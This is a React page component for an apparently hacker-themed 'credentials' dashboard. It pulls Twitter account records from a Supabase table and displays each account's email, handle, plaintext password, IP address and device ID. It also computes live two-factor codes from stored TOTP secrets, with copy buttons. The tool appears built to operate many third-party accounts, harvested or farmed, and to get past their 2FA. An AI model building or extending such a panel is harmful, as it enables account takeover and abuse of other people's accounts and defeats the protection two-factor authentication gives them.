import { useState, useEffect } from 'react';
import { Shield, Copy, Check, Eye, EyeOff, Search, ChevronLeft, ChevronRight } from 'lucide-react';
import { credentials, Credential } from '../data/mockData';
import { supabase, DbAccount } from '../lib/supabase';
import { generateTOTP, secondsUntilNextWindow } from '../utils/totp';

const ITEMS_PER_PAGE = 15;

interface CopiedState {
  [key: string]: boolean;
}

interface VisiblePasswords {
  [key: string]: boolean;
}

const dbToCredential = (row: DbAccount): Credential => {
  return {
    id: row.id,
    name: `${row.first_name} ${row.last_name}`.trim(),
    handle: row.handle ?? null,
    password: row.password ?? '',
    email: row.email ?? '',
    ipAddress: '',
    twoFaSecret: row.totp_secret ?? null,
    deviceId: row.device ?? '',
    createdAt: row.ts ?? '',
  };
};

const TOTPDisplay = ({ secret, code }: { secret: string; code: string }) => {
  const [secondsLeft, setSecondsLeft] = useState<number>(secondsUntilNextWindow());
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft(secondsUntilNextWindow());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const progress = (secondsLeft / 30) * 100;

  return (
    <div className="flex items-center gap-3">
      <div className="flex-1">
        <div className="relative inline-block">
          <svg width="60" height="60" viewBox="0 0 60 60" className="transform -rotate-90">
            <circle cx="30" cy="30" r="27" fill="none" stroke="#1e2d3d" strokeWidth="2" />
            <circle
              cx="30"
              cy="30"
              r="27"
              fill="none"
              stroke="#00ff41"
              strokeWidth="2"
              strokeDasharray={`${2 * Math.PI * 27}`}
              strokeDashoffset={`${2 * Math.PI * 27 * (1 - progress / 100)}`}
              className="transition-all duration-1000"
            />
          </svg>
          <div className="absolute inset-0 flex items-center justify-center">
            <span className="font-mono text-xs font-bold text-[#00ff41]">{secondsLeft}s</span>
          </div>
        </div>
      </div>
      <div className="flex items-center gap-2">
        <input
          type="text"
          value={code}
          readOnly
          className="w-32 px-3 py-2 bg-[#111827] border border-[#1e2d3d] text-[#00ff41] font-mono text-sm rounded"
        />
        <button
          onClick={handleCopy}
          className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#00d4ff] hover:border-[#00d4ff]/60 rounded transition-all"
        >
          {copied ? <Check size={16} /> : <Copy size={16} />}
        </button>
      </div>
    </div>
  );
};

const CredentialCard = ({ credential }: { credential: Credential }) => {
  const [copiedFields, setCopiedFields] = useState<CopiedState>({});
  const [showPassword, setShowPassword] = useState(false);
  const [totp, setTotp] = useState<string>('');

  useEffect(() => {
    if (credential.twoFaSecret) {
      setTotp(generateTOTP(credential.twoFaSecret));
      const interval = setInterval(() => {
        setTotp(generateTOTP(credential.twoFaSecret!));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [credential.twoFaSecret]);

  const handleCopy = (field: string, value: string) => {
    navigator.clipboard.writeText(value);
    setCopiedFields(prev => ({ ...prev, [field]: true }));
    setTimeout(() => {
      setCopiedFields(prev => ({ ...prev, [field]: false }));
    }, 2000);
  };

  return (
    <div className="bg-[#0d1117] border border-[#1e2d3d] rounded p-5 hover:border-[#00ff41]/40 hover:shadow-[0_0_12px_rgba(0,255,65,0.1)] transition-all">
      {/* Header */}
      <div className="flex items-center gap-2 mb-4 pb-3 border-b border-[#1e2d3d]">
        <span className="text-[#00d4ff] font-mono font-bold text-sm">{credential.name}</span>
        {credential.twoFaSecret && <Shield size={14} className="text-[#00ff41]" />}
      </div>

      {/* Fields - Stacked vertically */}
      <div className="space-y-3 text-sm">
        {/* Handle */}
        {credential.handle && (
          <div className="flex flex-col gap-1">
            <label className="text-xs font-mono text-[#8b949e] uppercase">handle</label>
            <div className="flex gap-1">
              <input
                type="text"
                value={credential.handle}
                readOnly
                className="flex-1 px-3 py-2 bg-[#111827] border border-[#1e2d3d] text-[#e6edf3] font-mono text-sm rounded"
              />
              <button
                onClick={() => handleCopy('handle', credential.handle!)}
                className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#00d4ff] hover:border-[#00d4ff]/60 rounded transition-all"
              >
                {copiedFields['handle'] ? <Check size={16} /> : <Copy size={16} />}
              </button>
            </div>
          </div>
        )}

        {/* Email */}
        <div className="flex flex-col gap-1">
          <label className="text-xs font-mono text-[#8b949e] uppercase">email</label>
          <div className="flex gap-1">
            <input
              type="text"
              value={credential.email}
              readOnly
              className="flex-1 px-3 py-2 bg-[#111827] border border-[#1e2d3d] text-[#e6edf3] font-mono text-sm rounded"
            />
            <button
              onClick={() => handleCopy('email', credential.email)}
              className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#00d4ff] hover:border-[#00d4ff]/60 rounded transition-all"
            >
              {copiedFields['email'] ? <Check size={16} /> : <Copy size={16} />}
            </button>
          </div>
        </div>

        {/* Password with Eye toggle */}
        <div className="flex flex-col gap-1">
          <label className="text-xs font-mono text-[#8b949e] uppercase">password</label>
          <div className="flex gap-1">
            <input
              type={showPassword ? 'text' : 'password'}
              value={credential.password}
              readOnly
              className="flex-1 px-3 py-2 bg-[#111827] border border-[#1e2d3d] text-[#e6edf3] font-mono text-sm rounded"
            />
            <button
              onClick={() => setShowPassword(!showPassword)}
              className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#8b949e] hover:text-[#e6edf3] hover:border-[#00d4ff]/60 rounded transition-all"
            >
              {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
            </button>
            <button
              onClick={() => handleCopy('password', credential.password)}
              className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#00d4ff] hover:border-[#00d4ff]/60 rounded transition-all"
            >
              {copiedFields['password'] ? <Check size={16} /> : <Copy size={16} />}
            </button>
          </div>
        </div>

        {/* IP Address */}
        <div className="flex flex-col gap-1">
          <label className="text-xs font-mono text-[#8b949e] uppercase">ip address</label>
          <div className="flex gap-1">
            <input
              type="text"
              value={credential.ipAddress}
              readOnly
              className="flex-1 px-3 py-2 bg-[#111827] border border-[#1e2d3d] text-[#e6edf3] font-mono text-sm rounded"
            />
            <button
              onClick={() => handleCopy('ip', credential.ipAddress)}
              className="p-2 bg-[#111827] border border-[#1e2d3d] text-[#00d4ff] hover:border-[#00d4ff]/60 rounded transition-all"
            >
              {copiedFields['ip'] ? <Check size={16} /> : <Copy size={16} />}
            </button>
          </div>
        </div>
      </div>

      {/* 2FA Section */}
      {credential.twoFaSecret && (
        <div className="mt-3 pt-3 border-t border-[#1e2d3d]">
          <label className="text-xs font-mono text-[#8b949e] tracking-widest uppercase">live 2fa code</label>
          <div className="mt-2">
            <TOTPDisplay secret={credential.twoFaSecret} code={totp} />
          </div>
        </div>
      )}

      {/* Footer */}
      <div className="mt-3 pt-3 border-t border-[#1e2d3d]">
        <p className="text-xs font-mono text-[#8b949e]">
          device: {credential.deviceId} · created: {credential.createdAt}
        </p>
      </div>
    </div>
  );
};

export default function Credentials() {
  const [allCredentials, setAllCredentials] = useState<Credential[]>(credentials);
  const [searchQuery, setSearchQuery] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const [isSupabase, setIsSupabase] = useState(false);

  useEffect(() => {
    const fetchFromSupabase = async () => {
      try {
        const { data, error } = await supabase
          .from('twitter_accounts')
          .select('*')
          .eq('status', 'ok')
          .order('ts', { ascending: false });

        if (error) throw error;

        if (data && data.length > 0) {
          const dbCredentials = data.map(dbToCredential);
          setAllCredentials(dbCredentials);
          setIsSupabase(true);
        }
      } catch (error) {
        console.log('Using mock credentials:', error);
      }
    };

    fetchFromSupabase();
  }, []);

  // Filter by search query (email or IP)
  const filteredCredentials = allCredentials.filter(cred => {
    if (!searchQuery) return true;
    const query = searchQuery.toLowerCase();
    return (
      cred.email.toLowerCase().includes(query) ||
      cred.ipAddress.toLowerCase().includes(query) ||
      cred.name.toLowerCase().includes(query) ||
      (cred.handle && cred.handle.toLowerCase().includes(query))
    );
  });

  // Pagination
  const totalPages = Math.ceil(filteredCredentials.length / ITEMS_PER_PAGE);
  const startIndex = (currentPage - 1) * ITEMS_PER_PAGE;
  const paginatedCredentials = filteredCredentials.slice(startIndex, startIndex + ITEMS_PER_PAGE);

  // Reset to page 1 when search changes
  useEffect(() => {
    setCurrentPage(1);
  }, [searchQuery]);

  const counts = {
    all: allCredentials.length,
    '2fa': allCredentials.filter(c => c.twoFaSecret).length,
    handle: allCredentials.filter(c => c.handle).length,
  };

  return (
    <div className="min-h-screen bg-[#0a0e1a] p-8">
      {/* Header */}
      <div className="mb-6">
        <div className="flex items-center gap-4 mb-4 flex-wrap">
          <h1 className="text-2xl font-mono font-bold text-[#e6edf3]">credentials</h1>
          {isSupabase && (
            <span className="text-xs font-mono px-2 py-1 bg-[#0d1117] border border-[#1e2d3d] text-[#8b949e] rounded">
              supabase
            </span>
          )}
        </div>

        {/* Stats (left) + Search (right) - Same Row */}
        <div className="flex items-center justify-between gap-4">
          {/* Stats - Left side */}
          <div className="flex items-center gap-3 text-xs font-mono">
            <div className="px-3 py-2 bg-[#0d1117] border border-[#1e2d3d] rounded">
              <span className="text-[#8b949e]">total:</span>{' '}
              <span className="text-[#00ff41] font-bold">{counts.all}</span>
            </div>
            <div className="px-3 py-2 bg-[#0d1117] border border-[#1e2d3d] rounded">
              <span className="text-[#8b949e]">2fa enabled:</span>{' '}
              <span className="text-[#00d4ff] font-bold">{counts['2fa']}</span>
            </div>
            <div className="px-3 py-2 bg-[#0d1117] border border-[#1e2d3d] rounded">
              <span className="text-[#8b949e]">with handle:</span>{' '}
              <span className="text-yellow-400 font-bold">{counts.handle}</span>
            </div>
            <div className="px-3 py-2 bg-[#0d1117] border border-[#1e2d3d] rounded text-[#8b949e]">
              {filteredCredentials.length} results
            </div>
          </div>

          {/* Search Bar - Right side */}
          <div className="relative w-[380px]">
            <Search size={18} className="absolute left-3 top-1/2 -translate-y-1/2 text-[#8b949e]" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by email, IP, name, handle..."
              className="w-full pl-10 pr-4 py-2 bg-[#0d1117] border border-[#1e2d3d] text-[#e6edf3] font-mono text-sm rounded focus:outline-none focus:border-[#00d4ff] transition-all"
            />
          </div>
        </div>
      </div>

      {/* Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4">
        {paginatedCredentials.map(credential => (
          <CredentialCard key={credential.id} credential={credential} />
        ))}
      </div>

      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-2 mt-8">
          <button
            onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
            disabled={currentPage === 1}
            className="p-2 bg-[#0d1117] border border-[#1e2d3d] text-[#e6edf3] rounded hover:border-[#00ff41]/60 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
          >
            <ChevronLeft size={18} />
          </button>

          <div className="flex items-center gap-1">
            {Array.from({ length: totalPages }, (_, i) => i + 1).map(page => (
              <button
                key={page}
                onClick={() => setCurrentPage(page)}
                className={`w-8 h-8 rounded font-mono text-sm transition-all ${
                  currentPage === page
                    ? 'bg-[#00ff41] text-[#0a0e1a] font-bold'
                    : 'bg-[#0d1117] border border-[#1e2d3d] text-[#e6edf3] hover:border-[#00ff41]/60'
                }`}
              >
                {page}
              </button>
            ))}
          </div>

          <button
            onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
            disabled={currentPage === totalPages}
            className="p-2 bg-[#0d1117] border border-[#1e2d3d] text-[#e6edf3] rounded hover:border-[#00ff41]/60 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
          >
            <ChevronRight size={18} />
          </button>

          <span className="ml-2 text-xs font-mono text-[#8b949e]">
            page {currentPage} of {totalPages}
          </span>
        </div>
      )}

      {filteredCredentials.length === 0 && (
        <div className="flex items-center justify-center h-64">
          <p className="text-[#8b949e] font-mono">no credentials match search</p>
        </div>
      )}
    </div>
  );
}
